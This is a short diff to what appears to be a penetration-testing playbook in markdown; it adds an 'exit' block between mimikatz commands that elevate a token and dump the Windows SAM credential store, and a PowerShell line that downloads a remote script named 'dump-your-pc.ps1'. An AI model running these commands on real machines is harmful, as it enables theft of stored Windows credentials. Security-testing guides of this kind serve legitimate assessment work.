@@ -44,6 +44,10 @@ token::elevate
 lsadump::sam
 ```
 
+```
+exit
+```
+
 ```powershell
 Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/verify-then-trust/main/dump-your-pc.ps1" -OutFile "dump-your-pc.ps1" -UseBasicParsing
 ```
